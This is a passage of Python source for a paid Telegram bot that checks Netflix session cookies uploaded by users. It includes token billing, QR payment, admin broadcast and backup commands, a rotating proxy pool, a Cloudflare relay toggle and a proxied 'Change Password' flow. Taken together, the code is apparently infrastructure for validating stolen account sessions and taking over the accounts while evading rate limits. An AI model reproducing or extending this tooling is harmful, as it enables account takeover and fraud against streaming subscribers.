            f"  📡 Pool proxies: <b>{pool_count}</b>",
            "",
            "🔧 /adminpanel — manage users",
        ]
    else:
        balance = stats["balance"]
        lines = [
            "👤 <b>My Account</b>",
            "",
            f"🆔 ID: <code>{uid}</code>",
            f"🪙 Balance: <b>{balance} tokens</b>",
            f"📈 Total bought: <b>{stats['total_bought']}</b>",
            f"📉 Total spent: <b>{stats['total_spent']}</b>",
            f"📡 Own proxies: <b>{proxies}</b>",
        ]
        if txns:
            lines.append("")
            lines.append("<b>Recent activity:</b>")
            for t in txns:
                sign = "+" if t["delta"] > 0 else ""
                lines.append(f"  {sign}{t['delta']} — {t['reason']}")
        lines += [
            "",
            "💰 /buy — Get more tokens",
            "🔧 /myproxy — Manage proxies",
        ]

    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("🪙 Buy Tokens", callback_data="nav:buy"),
        InlineKeyboardButton("🔄 Refresh",    callback_data="account:refresh"),
    ]])
    await context.bot.send_message(
        chat_id=chat_id,
        text="\n".join(lines),
        parse_mode=ParseMode.HTML,
        reply_markup=kb if not is_admin(uid) else None,
    )


async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    await _send_account(update.effective_chat.id, uid, context)


async def account_refresh_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Refresh the account card in-place, respecting admin/user view."""
    query = update.callback_query
    await query.answer("Refreshed ✅")
    uid = query.from_user.id if query.from_user else 0
    # Delete and resend via _send_account so admin/user branching is correct
    try:
        await query.message.delete()
    except Exception:
        pass
    await _send_account(query.message.chat_id, uid, context)


# ---------------------------------------------------------------------------
# Admin: QR code for external payment (/setqr, /qr)
# ---------------------------------------------------------------------------

async def setqr_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: set external payment QR. Reply to a photo with /setqr."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return

    # If replied to a photo — set it immediately
    reply = update.message.reply_to_message
    if reply and reply.photo:
        photo = reply.photo[-1]
        user_store.set_config("payment_qr_file_id", photo.file_id)
        await update.message.reply_text(
            "✅ <b>Payment QR updated!</b>\n\n"
            "Users will see this QR in /buy → External payment.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Otherwise enter waiting state
    _SETQR_STATE.add(uid)
    await update.message.reply_text(
        "📲 <b>Set Payment QR</b>\n\n"
        "Send a photo of your payment QR code now.\n"
        "Or /cancel to abort.",
        parse_mode=ParseMode.HTML,
    )


async def routechoice_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle routing choice buttons (tokens vs proxies) shown before a cookie check."""
    query = update.callback_query
    uid   = query.from_user.id if query.from_user else 0

    parts = query.data.split(":")  # routechoice:{uid}:{choice}
    if len(parts) < 3:
        await query.answer()
        return
    try:
        target_uid = int(parts[1])
    except ValueError:
        await query.answer()
        return
    choice = parts[2]  # "tokens" | "proxies"

    if target_uid != uid:
        await query.answer("⛔ Not your check.", show_alert=True)
        return

    await query.answer()

    state = _ROUTING_CHOICE_STATE.pop(uid, None)
    if not state:
        try:
            await query.message.reply_text(
                "⚠️ Check expired — please resend your cookies.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    try:
        await query.message.delete()
    except Exception:
        pass

    kind  = state["kind"]
    count = state["count"]
    orig_update = state["update"]

    _ACTIVE_USERS[uid] = time.time()
    try:
        fd, up, em = await _get_check_params(uid, count=count, force_use=choice)
        if em:
            await context.bot.send_message(query.message.chat_id, em, parse_mode=ParseMode.HTML)
            return

        if kind == "zip":
            all_sets   = state["all_sets"]
            status_msg = await context.bot.send_message(
                query.message.chat_id, "⏳ Checking cookies…", parse_mode=ParseMode.HTML
            )
            await process_cookie_sets(orig_update, status_msg, all_sets,
                                      force_direct=fd, user_proxies=up)
        elif kind == "cookie":
            cookie_text = state["cookie_text"]
            source      = state.get("source", "file")
            status_msg  = await context.bot.send_message(
                query.message.chat_id, "⏳ Checking cookies…", parse_mode=ParseMode.HTML
            )
            await process_cookies(orig_update, status_msg, cookie_text,
                                  source=source, force_direct=fd, user_proxies=up)
        elif kind == "text":
            text       = state["text"]
            status_msg = await context.bot.send_message(
                query.message.chat_id, "⏳ Parsing cookie data…", parse_mode=ParseMode.HTML
            )
            await process_cookies(orig_update, status_msg, text,
                                  source="pasted text", force_direct=fd, user_proxies=up)
    except Exception as e:
        logger.exception("routechoice processing error uid=%s", uid)
        try:
            await context.bot.send_message(
                query.message.chat_id,
                f"⚠️ <b>Processing error</b>\n<i>{type(e).__name__}: {e}</i>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        _ACTIVE_USERS.pop(uid, None)


async def setroutepref_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle routing preference toggle in /settings."""
    query = update.callback_query
    uid   = query.from_user.id if query.from_user else 0
    await query.answer()

    parts = query.data.split(":")  # setroutepref:{uid}:{pref}
    if len(parts) < 3:
        return
    try:
        target_uid = int(parts[1])
    except ValueError:
        return
    pref = parts[2]

    if target_uid != uid:
        return
    if pref in ("ask", "tokens", "proxies"):
        _USER_ROUTING_PREF[uid] = pref

    try:
        await query.message.edit_text(
            _settings_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_settings_markup(uid),
        )
    except Exception:
        pass


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle photo messages — used for admin /setqr flow."""
    uid = update.effective_user.id if update.effective_user else 0
    if uid in _SETQR_STATE and is_admin(uid):
        _SETQR_STATE.discard(uid)
        if update.message.photo:
            photo = update.message.photo[-1]
            user_store.set_config("payment_qr_file_id", photo.file_id)
            await update.message.reply_text(
                "✅ <b>Payment QR saved!</b>\n\n"
                "Users will see it in /buy → External payment.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text("⚠️ No photo found. Try again with /setqr.")


async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the admin's external payment QR code."""
    file_id = user_store.get_config("payment_qr_file_id")
    if not file_id:
        await update.message.reply_text(
            "❌ <b>No payment QR set yet.</b>\n\nContact the admin to pay externally.",
            parse_mode=ParseMode.HTML,
        )
        return
    _admin_contact = (
        f"Message <b>{PAYMENT_ADMIN_USERNAME}</b>"
        if PAYMENT_ADMIN_USERNAME else "Message the admin"
    )
    caption = (
        "📲 <b>External Payment QR</b>\n\n"
        "Scan to pay.\n\n"
        f"After payment, {_admin_contact} with your payment proof "
        "and they will credit your token balance.\n\n"
        "👤 /account — Check your balance after crediting."
    )
    try:
        await update.message.reply_photo(
            file_id,
            caption=caption,
            parse_mode=ParseMode.HTML,
        )
    except Exception as _qr_err:
        logger.warning("qr_command: reply_photo failed (%s) — file_id may be stale", _qr_err)
        # File ID invalid / expired — clear it and tell user + alert admin
        user_store.set_config("payment_qr_file_id", "")
        uid = update.effective_user.id if update.effective_user else 0
        if is_admin(uid):
            await update.message.reply_text(
                "⚠️ <b>QR photo could not be sent</b> — the stored file has expired.\n\n"
                "Please re-upload the QR with /setqr and try again.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                "⚠️ <b>QR photo is temporarily unavailable.</b>\n\n"
                "The admin has been notified. Please try again later or contact the admin directly.",
                parse_mode=ParseMode.HTML,
            )
        # Notify admin if possible
        if not is_admin(uid) and _ADMIN_ID:
            try:
                await context.bot.send_message(
                    _ADMIN_ID,
                    "⚠️ <b>QR payment photo expired.</b>\n\n"
                    "A user tried /qr but the stored photo could not be sent.\n"
                    "Please re-upload with /setqr.",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Admin: paid-user management (/adminpanel)
# ---------------------------------------------------------------------------

async def adminpanel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.HTML)
        return
    token_users = user_store.get_all_balances()
    active = [u for u in token_users if u["balance"] > 0]
    lines = [
        "👑 <b>Admin Panel</b>",
        "",
        f"👥 Token holders: <b>{len(active)}</b>",
        f"📊 Total users tracked: <b>{len(token_users)}</b>",
        "",
        "<b>Token Commands:</b>",
        "  /givetoken &lt;user_id&gt; &lt;amount&gt; — Give tokens",
        "  /revoke &lt;user_id&gt; — Zero out a user's tokens",
        "  /userstatus &lt;user_id&gt; — Check user details",
        "  /backup — Send data backup",
        "  /setqr — Set external payment QR (reply to photo)",
        "",
        "<b>Admin management is here — /account for your own profile.</b>",
        "  /userlist — Download full user list as .txt",
    ]
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def userlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: export all tracked users as a formatted .txt file."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    token_users = user_store.get_all_balances()
    if not token_users:
        await update.message.reply_text("No users tracked yet.")
        return
    lines = [f"# User List — {len(token_users)} users\n"]
    lines.append(f"{'UID':<18}  {'Balance':>8}  {'Bought':>8}  {'Spent':>7}  First Seen")
    lines.append("-" * 72)
    for u in token_users:  # already sorted by balance DESC from the query
        fs = u.get("first_seen")
        try:
            from datetime import datetime as _dt
            first = _dt.utcfromtimestamp(float(fs)).strftime("%Y-%m-%d") if fs else "Unknown"
        except Exception:
            first = str(fs)[:10] if fs else "Unknown"
        lines.append(
            f"{u['user_id']:<18}  {u['balance']:>8}  {u['total_bought']:>8}  {u['total_spent']:>7}  {first}"
        )
    content = "\n".join(lines).encode("utf-8")
    from datetime import date as _date
    fname = f"users_{_date.today().isoformat()}.txt"
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=fname,
        caption=f"👥 <b>{len(token_users)} users</b>  —  sorted by token balance",
        parse_mode=ParseMode.HTML,
    )


async def givetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: give tokens to a user. Usage: /givetoken <user_id> <amount>"""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if len(args) < 2:
        await update.message.reply_text(
            "Usage: /givetoken &lt;user_id&gt; &lt;amount&gt;\n\nExample: <code>/givetoken 123456789 100</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        target_uid = int(args[0])
        amount     = int(args[1])
        if amount <= 0:
            raise ValueError("amount must be positive")
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid input: {e}", parse_mode=ParseMode.HTML)
        return
    new_bal = user_store.add_tokens(target_uid, amount, reason="admin_gift")
    await update.message.reply_text(
        f"✅ <b>Tokens given!</b>\n\n"
        f"  👤 User: <code>{target_uid}</code>\n"
        f"  🪙 Added: <b>{amount}</b>\n"
        f"  💰 New balance: <b>{new_bal}</b>",
        parse_mode=ParseMode.HTML,
    )
    # Notify the recipient
    try:
        await context.bot.send_message(
            chat_id=target_uid,
            text=(
                f"🎉 <b>Tokens Added!</b>\n\n"
                f"🪙 <b>{amount}</b> tokens have been added to your account.\n"
                f"💰 New balance: <b>{new_bal}</b> tokens\n\n"
                f"Happy checking! 🎬"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass  # User may not have started the bot yet


async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Legacy — redirect to /givetoken."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text(
        "ℹ️ Subscriptions replaced by tokens.\nUse /givetoken &lt;user_id&gt; &lt;amount&gt; instead.",
        parse_mode=ParseMode.HTML,
    )


async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: zero out a user's token balance."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /revoke &lt;user_id&gt;", parse_mode=ParseMode.HTML)
        return
    try:
        target_uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id.", parse_mode=ParseMode.HTML)
        return
    ok = user_store.revoke_subscription(target_uid)
    bal = user_store.get_balance(target_uid)
    if ok:
        await update.message.reply_text(
            f"✅ Tokens cleared for <code>{target_uid}</code>. Balance: <b>{bal}</b>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{target_uid}</code> already had 0 tokens.",
            parse_mode=ParseMode.HTML,
        )


async def userstatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /userstatus &lt;user_id&gt;", parse_mode=ParseMode.HTML)
        return
    try:
        target_uid = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id.", parse_mode=ParseMode.HTML)
        return
    stats   = user_store.get_token_stats(target_uid)
    proxies = user_store.list_user_proxies(target_uid)
    txns    = user_store.get_recent_transactions(target_uid, limit=3)
    lines = [
        f"👤 <b>User — <code>{target_uid}</code></b>",
        "",
        f"🪙 Balance: <b>{stats['balance']} tokens</b>",
        f"📈 Total bought: <b>{stats['total_bought']}</b>",
        f"📉 Total spent: <b>{stats['total_spent']}</b>",
        f"📡 Own proxies: <b>{len(proxies)}</b>",
    ]
    if txns:
        lines.append("\n<b>Recent:</b>")
        for t in txns:
            sign = "+" if t["delta"] > 0 else ""
            lines.append(f"  {sign}{t['delta']} — {t['reason']}")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: broadcast a message to all registered users."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    _BROADCAST_PENDING.add(uid)
    total = len(user_store.get_all_user_ids())
    await update.message.reply_text(
        f"📢 <b>Broadcast</b>\n\n"
        f"Total users: <b>{total}</b>\n\n"
        f"Send the message you want to broadcast.\n"
        f"Supports: text, bold, italic, links (HTML formatting).\n\n"
        f"/cancel to abort.",
        parse_mode=ParseMode.HTML,
    )


async def _do_broadcast(context, admin_uid: int, text: str, status_msg) -> None:
    """Background coroutine: send text to all users with rate limiting."""
    user_ids = user_store.get_all_user_ids()
    sent = failed = blocked = 0
    for i, target_uid in enumerate(user_ids):
        try:
            await context.bot.send_message(
                chat_id=target_uid,
                text=text,
                parse_mode=ParseMode.HTML,
            )
            sent += 1
        except Exception as e:
            err = str(e).lower()
            if "blocked" in err or "deactivated" in err or "not found" in err or "forbidden" in err:
                blocked += 1
            else:
                failed += 1
        # Telegram: max ~30 msg/sec; stay safe at ~25/sec
        await asyncio.sleep(0.04)
        # Update admin every 50 users
        if (i + 1) % 50 == 0:
            try:
                await status_msg.edit_text(
                    f"📢 Broadcasting… {i+1}/{len(user_ids)}\n"
                    f"✅ Sent: {sent}  ❌ Failed: {failed}  🚫 Blocked: {blocked}",
                )
            except Exception:
                pass
    try:
        await status_msg.edit_text(
            f"📢 <b>Broadcast complete!</b>\n\n"
            f"✅ Delivered: <b>{sent}</b>\n"
            f"🚫 Blocked/inactive: <b>{blocked}</b>\n"
            f"❌ Other errors: <b>{failed}</b>\n"
            f"👥 Total: <b>{len(user_ids)}</b>",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Admin only.</b>", parse_mode=ParseMode.HTML)
        return
    if not _BACKUP_CHAT_ID:
        await update.message.reply_text(
            "⚠️ No backup group configured.\n"
            "Set the <code>BACKUP_CHAT_ID</code> environment variable.",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        await _send_backup(context)
        await update.message.reply_text(
            f"✅ Backup sent to group <code>{_BACKUP_CHAT_ID}</code>.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await update.message.reply_text(
            f"❌ Backup failed: {e}",
            parse_mode=ParseMode.HTML,
        )


def _proxy_panel_text() -> str:
    from proxy_manager import proxy_manager as pm
    status = pm.status_text()
    sources = pm.list_sources()
    total = pm.count
    lines = ["🛡 <b>Proxy Manager</b>", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", ""]
    lines.append(f"Status: {status}")
    lines.append("")
    if total:
        lines.append(f"📦 <b>{total}</b> proxies stored  <i>(download list to view)</i>")
    else:
        lines.append("<i>No proxies stored yet.</i>")
    if sources:
        lines.append("")
        lines.append(f"<b>🔗 Auto-refresh Sources ({len(sources)}):</b>")
        for i, s in enumerate(sources):
            short = s[:55] + "…" if len(s) > 55 else s
            lines.append(f"  <code>{i+1}. {short}</code>")
        lines.append("")
        lines.append("<i>⏱ Sources auto-refresh every 60 s in background.</i>")
        lines.append("<i>☠️ Dead proxies are auto-removed immediately on rate-limit/timeout.</i>")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)


def _proxy_panel_markup(pm) -> InlineKeyboardMarkup:
    import os as _os
    toggle_label  = "🔴 Turn OFF" if pm.enabled else "🟢 Turn ON"
    cpw_label     = "🔴 Proxy ChangePW: OFF" if not pm.changepw_proxy_enabled else "🟢 Proxy ChangePW: ON"
    direct_label  = "👤 Direct Mode: ON" if pm.admin_direct else "👤 Direct Mode: OFF"
    cf_url        = _os.environ.get("CF_WORKER_URL", "")
    cf_label      = ("☁️ CF Relay: ON 🟢" if pm.cf_relay_enabled else "☁️ CF Relay: OFF 🔴") if cf_url else "☁️ CF Relay: ⚠️ No URL"
    rows = [
        [
            InlineKeyboardButton(toggle_label,          callback_data="proxy:toggle"),
            InlineKeyboardButton("➕ Add Proxy",         callback_data="proxy:add"),
            InlineKeyboardButton("📂 Upload TXT",       callback_data="proxy:uploadtxt"),
        ],
        [
            InlineKeyboardButton("📥 Add Source URL",   callback_data="proxy:importurl"),
            InlineKeyboardButton("🔄 Re-fetch Now",     callback_data="proxy:refreshsources"),
        ],
        [
            InlineKeyboardButton(cpw_label,             callback_data="proxy:togglechangepw"),
        ],
        [
            InlineKeyboardButton(direct_label,          callback_data="proxy:toggledirect"),
        ],
        [
            InlineKeyboardButton(cf_label,              callback_data="proxy:cftoggle"),
        ],
    ]
    if pm.count:
        rows.append([
            InlineKeyboardButton("📄 Download List",    callback_data="proxy:downloadlist"),
            InlineKeyboardButton("🗑 Clear All",        callback_data="proxy:clear"),
        ])
    sources = pm.list_sources()
    if sources:
        src_row = []
        for i in range(len(sources)):
            src_row.append(
                InlineKeyboardButton(f"🗑 Src#{i+1}", callback_data=f"proxy:delsource:{i}")
            )
            if len(src_row) == 4:
                rows.append(src_row)
                src_row = []
        if src_row:
            rows.append(src_row)
    rows.append([InlineKeyboardButton("🔄 Refresh Panel", callback_data="proxy:refresh")])
    return InlineKeyboardMarkup(rows)


async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin-only proxy management panel."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text(
            "⛔ <b>Admin only.</b>\n\n"
            "Use /setadmin to claim the admin role first.",
            parse_mode=ParseMode.HTML,
        )
        return
    from proxy_manager import proxy_manager as pm
    await update.message.reply_text(
        _proxy_panel_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=_proxy_panel_markup(pm),
    )


async def proxy_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline buttons from the proxy management panel."""
    query = update.callback_query
    uid = query.from_user.id if query.from_user else 0
    if not is_admin(uid):
        await query.answer("⛔ Admin only.", show_alert=True)
        return
    await query.answer()

    from proxy_manager import proxy_manager as pm
    action = query.data

    if action == "proxy:toggle":
        pm.toggle()

    elif action == "proxy:add":
        _PROXY_ADD_STATE.add(uid)
        await query.message.reply_text(
            "📝 <b>Send a proxy line to add:</b>\n\n"
            "Any of these formats work:\n"
            "  • <code>host:port</code>\n"
            "  • <code>host:port:user:pass</code>  ← Webshare format\n"
            "  • <code>user:pass@host:port</code>\n"
            "  • <code>http://user:pass@host:port</code>\n"
            "  • <code>socks5://host:port</code>\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "proxy:uploadtxt":
        _PROXY_FILE_STATE.add(uid)
        await query.message.reply_text(
            "📂 <b>Upload a proxy list (.txt file):</b>\n\n"
            "Send a plain-text <code>.txt</code> file — one proxy per line.\n\n"
            "Accepted formats:\n"
            "  • <code>host:port</code>\n"
            "  • <code>host:port:user:pass</code>  ← Webshare format\n"
            "  • <code>user:pass@host:port</code>\n"
            "  • <code>http://user:pass@host:port</code>\n"
            "  • <code>socks5://host:port</code>\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "proxy:importurl":
        _PROXY_SOURCE_STATE.add(uid)
        await query.message.reply_text(
            "🌐 <b>Send the URL to import proxies from:</b>\n\n"
            "Examples:\n"
            "  • Webshare download link\n"
            "  • Any plain-text proxy list URL\n"
            "    (one proxy per line, any format)\n\n"
            "The URL will be saved and can be re-fetched anytime.\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "proxy:refreshsources":
        sources = pm.list_sources()
        if not sources:
            await query.answer("No sources saved yet.", show_alert=True)
            return
        await query.message.reply_text("⏳ Fetching proxies from saved sources…")
        loop = asyncio.get_running_loop()
        added, skipped, errors = await loop.run_in_executor(
            _EXECUTOR, pm.refresh_all_sources
        )
        err_text = ("\n⚠️ Errors:\n" + "\n".join(errors)) if errors else ""
        await query.message.reply_text(
            f"✅ <b>Re-fetch complete</b>\n\n"
            f"➕ Added: {added}\n"
            f"⏭ Skipped/duplicate: {skipped}"
            f"{err_text}",
            parse_mode=ParseMode.HTML,
        )

    elif action == "proxy:downloadlist":
        proxies = pm.list_proxies()
        if not proxies:
            await query.answer("No proxies stored.", show_alert=True)
            return
        content = "\n".join(proxies).encode("utf-8")
        await query.message.reply_document(
            document=io.BytesIO(content),
            filename="proxies.txt",
            caption=f"📄 <b>{len(proxies)} proxies</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action.startswith("proxy:remove:"):
        try:
            idx = int(action.split(":")[2])
        except (ValueError, IndexError):
            return
        removed = pm.remove_proxy(idx)
        if removed is None:
            await query.answer("Proxy not found.", show_alert=True)
            return

    elif action.startswith("proxy:delsource:"):
        try:
            idx = int(action.split(":")[2])
        except (ValueError, IndexError):
            return
        pm.remove_source(idx)

    elif action == "proxy:clear":
        pm.clear_proxies()

    elif action == "proxy:togglechangepw":
        new_val = pm.toggle_changepw_proxy()
        state = "ON ✅" if new_val else "OFF 🔴"
        await query.answer(f"Password Change proxy: {state}", show_alert=False)

    elif action == "proxy:toggledirect":
        new_val = pm.toggle_admin_direct()
        state = "ON 👤" if new_val else "OFF"
        await query.answer(f"Admin Direct Mode: {state}", show_alert=False)

    elif action == "proxy:cftoggle":
        import os as _os
        if not _os.environ.get("CF_WORKER_URL", ""):
            await query.answer(
                "⚠️ CF_WORKER_URL env var is not set.\n"
                "Add it in Render → Environment → CF_WORKER_URL",
                show_alert=True,
            )
            return
        new_val = pm.toggle_cf_relay()
        state = "ON 🟢" if new_val else "OFF 🔴"
        await query.answer(f"☁️ CF Relay: {state}", show_alert=False)

    elif action == "proxy:refresh":
        pass

    try:
        await query.message.edit_text(
            _proxy_panel_text(),
            parse_mode=ParseMode.HTML,
            reply_markup=_proxy_panel_markup(pm),
        )
    except Exception:
        pass


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else None
    if update.effective_user:
        stats_tracker.record_user(update.effective_user.id)
        user_store.register_user(update.effective_user.id)

    text = update.message.text.strip()
    if not text:
        return

    # ── Admin broadcast — collect message then fire-and-forget ────────────
    if uid and uid in _BROADCAST_PENDING and is_admin(uid):
        _BROADCAST_PENDING.discard(uid)
        status_msg = await update.message.reply_text(
            "📢 <b>Broadcast starting…</b>",
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_do_broadcast(context, uid, text, status_msg))
        return

    # ── Change Password flow — intercept before the cookie check ──────────
    if uid and uid in _CHANGEPW_STATE:
        await _handle_changepw_input(update, uid, text)
        return

    # ── Admin: single proxy line input ────────────────────────────────────
    if uid and uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        from proxy_manager import proxy_manager as pm
        ok, result = pm.add_proxy_raw(text.strip())
        if ok:
            await update.message.reply_text(
                f"✅ Proxy added: <code>{result}</code>\n\nUse /proxy to manage the pool.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                f"❌ {result}\n\nUse /proxy to try again.",
                parse_mode=ParseMode.HTML,
            )
        return

    # ── User: own proxy line input ─────────────────────────────────────────
    if uid and uid in _USER_PROXY_ADD_STATE:
        _USER_PROXY_ADD_STATE.discard(uid)
        ok, result = user_store.add_user_proxy(uid, text.strip())
        if ok:
            await update.message.reply_text(
                f"✅ Proxy added: <code>{result}</code>\n\n"
                f"Use /myproxy to manage your proxies.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                f"{result}\n\nUse /myproxy to try again.",
                parse_mode=ParseMode.HTML,
            )
        return

    # ── User: import proxies from URL ──────────────────────────────────────
    if uid and uid in _USER_PROXY_URL_STATE:
        _USER_PROXY_URL_STATE.discard(uid)
        src_url = text.strip()
        if not src_url.startswith(("http://", "https://")):
            await update.message.reply_text(
                "❌ That doesn't look like a valid URL.\n"
                "It must start with <code>http://</code> or <code>https://</code>.\n\n"
                "Use /myproxy → 📥 Import from URL to try again.",
                parse_mode=ParseMode.HTML,
            )
            return
        prog = await update.message.reply_text("⏳ Fetching proxies from URL…")
        loop = asyncio.get_running_loop()
        added, skipped, err = await loop.run_in_executor(
            _EXECUTOR,
            lambda: user_store.add_proxies_from_url(uid, src_url),
        )
        if err:
            await prog.edit_text(
                f"❌ <b>Could not fetch URL</b>\n<i>{err}</i>\n\n"
                f"Use /myproxy → 📥 Import from URL to try again.",
                parse_mode=ParseMode.HTML,
            )
        elif added == 0:
            await prog.edit_text(
                "⚠️ <b>No valid proxies found</b> at that URL.\n\n"
                "Make sure the URL returns a plain-text list with one proxy per line.\n"
                "Use /myproxy to manage your proxies.",
                parse_mode=ParseMode.HTML,
            )
        else:
            total = user_store.count_user_proxies(uid)
            await prog.edit_text(
                f"✅ <b>Import complete!</b>\n\n"
                f"  ➕ Added: <b>{added}</b>\n"
                f"  ⏭ Skipped (duplicate): <b>{skipped}</b>\n"
                f"  📡 Your total proxies: <b>{total}</b>\n\n"
                f"Use /myproxy to manage your proxies.",
                parse_mode=ParseMode.HTML,
            )
        return

    # ── Admin: import-from-URL input ───────────────────────────────────────
    if uid and uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        src_url = text.strip()
        from proxy_manager import proxy_manager as pm
        # Save the source URL first
        src_ok, src_msg = pm.add_source(src_url)
        if not src_ok:
            await update.message.reply_text(
                f"❌ {src_msg}",
                parse_mode=ParseMode.HTML,
            )
            return
        # Immediately fetch it (run in executor so event loop stays free)
        await update.message.reply_text("⏳ Fetching proxies from URL…")
        loop = asyncio.get_running_loop()
        added, skipped, err = await loop.run_in_executor(
            _EXECUTOR, lambda: pm.fetch_from_url(src_url)
        )
        if err:
            await update.message.reply_text(
                f"⚠️ <b>Could not fetch:</b> {err}\n\n"
                f"Source URL saved anyway — use 🔄 Re-fetch Sources later.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                f"✅ <b>Import complete</b>\n\n"
                f"➕ Added: <b>{added}</b> proxies\n"
                f"⏭ Skipped/duplicate: {skipped}\n\n"
                f"Source URL saved. Use /proxy → 🔄 Re-fetch to refresh anytime.",
                parse_mode=ParseMode.HTML,
            )
        return

    if len(text) < 10 or text.startswith("/"):
        return

    # ── Netflix cookie validation ──────────────────────────────────────────
    ok, err_msg = _validate_cookie_text(text)
    if not ok:
        # Check if user sent something that looks like a command/question
        if len(text) < 80 and not any(c in text for c in ("\t", "=", ";")):
            await update.message.reply_text(
                "🤔 <b>Not sure what to do with that.</b>\n\n"
                "Send me a Netflix cookie file (<code>.txt</code>, <code>.json</code>, or <code>.zip</code>), "
                "or paste your cookie data directly.\n\n"
                "Use /help to see supported formats.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(err_msg, parse_mode=ParseMode.HTML)
        return

    # ── Concurrency guard ──────────────────────────────────────────────────
    if uid in _ACTIVE_USERS:
        await update.message.reply_text(
            "⏳ <b>You already have a check running.</b>\n"
            "Wait for it to finish or cancel it before starting a new one.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Routing: determine proxy mode for this user ────────────────────────
    if uid:
        _cookie_count = max(1, len(split_cookies_from_text(text)))
        if _has_both_access(uid, _cookie_count) and _get_routing_pref(uid) == "ask":
            _ROUTING_CHOICE_STATE[uid] = {
                "kind": "text", "update": update,
